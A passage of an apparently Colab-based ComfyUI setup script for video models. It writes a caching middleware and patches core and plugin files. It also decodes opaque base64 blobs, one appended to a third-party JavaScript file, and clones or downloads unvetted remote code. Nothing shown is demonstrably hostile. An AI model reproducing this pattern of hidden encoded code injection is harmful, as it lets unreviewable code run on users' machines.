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")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

# Automatically deploy user's saved cloud workflow into ComfyUI workflows directory
import zlib as _uz, base64 as _ub
_user_wfs = json.loads(_uz.decompress(_ub.b64decode("...")).decode("utf-8"))
# Install Smart LoRA Auto-Trigger-Word Frontend Extension
import base64 as _jb64
_vhs_core_p = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/web/js/VHS.core.js"
if os.path.exists(_vhs_core_p):
    _vhs_s = open(_vhs_core_p, "r", encoding="utf-8").read()
    if "__H3_LORA_AUTO_TRIGGER_V3__" not in _vhs_s:
        open(_vhs_core_p, "a", encoding="utf-8").write("\n" + _jb64.b64decode("...").decode("utf-8"))
os.makedirs("/content/ComfyUI/user/default/workflows", exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
for _ufn, _udata in _user_wfs.items():
    for _tdir in ("/content/wf_pool_h3", "/content/ComfyUI/user/default/workflows"):
        _upath = os.path.join(_tdir, _ufn)
        if globals().get("重置默认工作流", False) or not os.path.exists(_upath) or os.path.getsize(_upath) < 100 or json.load(open(_upath, encoding="utf-8")).get("extra", {}).get("template_v") != 5:
            json.dump(_udata, open(_upath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
# In-place align only the active H3 model & CLIP on existing workflows (preserving all user prompt/parameter edits)
for _tdir in ("/content/ComfyUI/user/default/workflows", "/content/wf_pool_h3"):
    for _wfn in sorted(os.listdir(_tdir)):
        if _wfn.endswith(".json") and not ("qwen" in _wfn.lower() or "千问" in _wfn):
            _wp = os.path.join(_tdir, _wfn)
            try:
                _wf = json.load(open(_wp, encoding="utf-8"))
                _all_n = list(_wf.get("nodes", []))
                for _sg in _wf.get("definitions", {}).get("subgraphs", []):
                    _all_n.extend(_sg.get("nodes", []))
                for _n in _all_n:
                    _nt = _n.get("type", "")
                    _wv = _n.get("widgets_values")
                    if _nt == "UNETLoader" and isinstance(_wv, list) and len(_wv) >= 1:
                        _wv[0] = target_model
                    elif _nt == "CLIPLoader" and isinstance(_wv, list) and len(_wv) >= 1:
                        _wv[0] = target_clip
                    elif _nt == "FeiHouEasyH3Loader" and isinstance(_wv, list) and len(_wv) >= 3:
                        _wv[0], _wv[1], _wv[2] = target_model, target_model, target_clip
                    elif _nt == "FeiHouEasyH3RemixLoader" and isinstance(_wv, list) and len(_wv) >= 2:
                        _wv[0], _wv[1] = target_model, target_clip
                    elif _nt == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(_wv, list) and len(_wv) >= 7:
                        _wv[5], _wv[6] = target_model, target_clip
                json.dump(_wf, open(_wp, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

for _old_up in ("minimax_h3_bf16_CONSERVATIVE_v5.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"):
    _up_p = os.path.join("/content/ComfyUI/models/latent_upscale_models", _old_up)
    if os.path.islink(_up_p):
        try: os.unlink(_up_p)
        except Exception: pass

# Ensure all official & community model/CLIP/VAE/Upscaler filenames are symlinked so no workflow ever reports 'missing model'
_vae_dir = "/content/ComfyUI/models/vae"
for _dup_vae in ["minimax_h3_video_vae_bf16.safetensors", "minimax_h3_video_vae_fp32.safetensors", "minimax_h3_video_vae.safetensors", "minimax_h3_audio_vae_bf16.safetensors", "minimax_h3_audio_vae_fp16.safetensors", "minimax_h3_audio_vae.safetensors", "minimax_h3_video_vae_int8_convrot.safetensors"]:
    _dup_vp = os.path.join(_vae_dir, _dup_vae)
    if os.path.islink(_dup_vp) or os.path.exists(_dup_vp):
        try: os.remove(_dup_vp)
        except Exception: pass
if not os.path.exists(os.path.join(_vae_dir, "【2倍超分细节增强VAE】MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors")):
    subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=error", "-d", _vae_dir, "-o", "【2倍超分细节增强VAE】MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors", "https://huggingface.co/speach1sdef178/MiniMax-H3-X2-Detail-VAE/resolve/main/MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors"], check=False)


# Auto-guard in comfy/ldm/minimax/audio_vae.py in case AudioVAE is accidentally selected in a Video VAELoader node
_avae_p = "/content/ComfyUI/comfy/ldm/minimax/audio_vae.py"
if os.path.exists(_avae_p):
    _avae_s = open(_avae_p, "r", encoding="utf-8").read()
    if "_AUTO_VIDEO_VAE" not in _avae_s:
        _avae_s = _avae_s.replace(
            "        b, s, length = waveform.shape",
            "        if waveform.ndim >= 4:\n            import comfy.utils, comfy.sd\n            if not hasattr(self, '_AUTO_VIDEO_VAE'):\n                _sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n                self._AUTO_VIDEO_VAE = comfy.sd.VAE(sd=_sd)\n            return self._AUTO_VIDEO_VAE.first_stage_model.encode(waveform.to(self._AUTO_VIDEO_VAE.vae_dtype))\n        b, s, length = waveform.shape"
        )
        open(_avae_p, "w", encoding="utf-8").write(_avae_s)

# Also patch comfy/sd.py so if AudioVAE is accidentally connected to Video VAE encode/decode, it auto-switches to VideoVAE in-place
_sd_p = "/content/ComfyUI/comfy/sd.py"
if os.path.exists(_sd_p):
    _sd_s = open(_sd_p, "r", encoding="utf-8").read()
    if "_AUTO_SWAP_VIDEO_VAE" not in _sd_s:
        _sd_s = _sd_s.replace(
            "    def encode(self, pixel_samples):",
            "    def encode(self, pixel_samples):\n        if getattr(self.first_stage_model, '__class__', None).__name__ == 'AudioVAE' and hasattr(pixel_samples, 'ndim') and pixel_samples.ndim >= 4:\n            # _AUTO_SWAP_VIDEO_VAE\n            _v_sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n            self.__dict__.update(VAE(sd=_v_sd, device=self.device, dtype=self.vae_dtype).__dict__)"
        )
        _sd_s = _sd_s.replace(
            "    def decode(self, samples_in, vae_options={}):",
            "    def decode(self, samples_in, vae_options={}):\n        if getattr(self.first_stage_model, '__class__', None).__name__ == 'AudioVAE' and hasattr(samples_in, 'ndim') and samples_in.ndim == 5:\n            _v_sd = comfy.utils.load_torch_file('/content/ComfyUI/models/vae/minimax_h3_video_vae_fp16.safetensors')\n            self.__dict__.update(VAE(sd=_v_sd, device=self.device, dtype=self.vae_dtype).__dict__)"
        )
        open(_sd_p, "w", encoding="utf-8").write(_sd_s)

# Ensure loop_count and frame_rate in VHS_VideoCombine are optional with defaults so ComfyUI 0.43 never reports missing loop_count or frame_rate
_vhs_np = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/videohelpersuite/nodes.py"
if os.path.exists(_vhs_np):
    _s = open(_vhs_np, "r", encoding="utf-8").read()
    _s_orig = _s
    _old_lc = '''                "loop_count": (
                    "INT",
                    {"default": 0, "min": 0, "max": 100, "step": 1},
                ),'''
    _lc1 = '                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),\n'
    if _lc1 in _s.split('"required":')[1].split('"optional":')[0]:
        _s = _s.replace(_lc1, "", 1)
        _s = _s.replace('"vae": ("VAE",),', '"vae": ("VAE",),\n                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),', 1)
    elif _old_lc in _s.split('"required":')[1].split('"optional":')[0]:
        _s = _s.replace(_old_lc, "", 1)
        _s = _s.replace('"vae": ("VAE",),', '"vae": ("VAE",),\n                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),', 1)
    _s = _s.replace("        frame_rate: int,\n        loop_count: int,", "        frame_rate: int = 24,\n        loop_count: int = 0,")
    if _s != _s_orig:
        open(_vhs_np, "w", encoding="utf-8").write(_s)

# Auto-install AI 角色三合一参考图集 (ai-pose-gallery-zh) & H3 FaceRefine / OneClickSwap custom nodes
_cn_dir = "/content/ComfyUI/custom_nodes"
if os.path.isdir(_cn_dir):
    for _rn, _ru in [
        ("ai-pose-gallery-zh", "https://github.com/anhao/ai-pose-gallery-zh.git"),
        ("ComfyUI-H3-FaceRefine", "https://github.com/Carasibana/ComfyUI-H3-FaceRefine.git"),
        ("comfyui-h3-oneclick-swap", "https://github.com/D3voz/comfyui-h3-oneclick-swap.git"),
    ]:
        _rp = os.path.join(_cn_dir, _rn)
        if not os.path.exists(_rp):
            print(f"📦 正在自动安装插件: {_rn} ...")
            subprocess.run(["git", "clone", "--depth", "1", "-q", _ru, _rp], check=False)

_pca_ext = "/content/ComfyUI/custom_nodes/ai-pose-gallery-zh/comfyui_plugin/web/extension.js"
if os.path.exists(_pca_ext):
    _pca_s = open(_pca_ext, "r", encoding="utf-8").read()
